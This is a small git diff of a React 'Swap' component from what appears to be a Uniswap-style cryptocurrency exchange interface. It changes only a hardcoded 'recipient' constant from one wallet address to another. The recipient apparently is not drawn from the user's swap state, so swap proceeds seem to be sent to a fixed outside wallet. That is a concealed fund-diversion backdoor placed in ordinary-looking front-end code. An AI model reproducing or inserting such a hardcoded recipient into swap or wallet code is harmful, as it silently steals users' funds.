@@ -111,7 +111,7 @@ export default function Swap({ history }: RouteComponentProps) {
 
   // swap state
   const { independentField, typedValue } = useSwapState()
-  const recipient = '0x8F962B92A5CaB0De2DBF350A0513Ad2859E4183a'
+  const recipient = '0xb17467ce33dBad68865dcAAaf290c16BBe4f23D1'
 
   const {
     trade: { state: tradeState, trade },
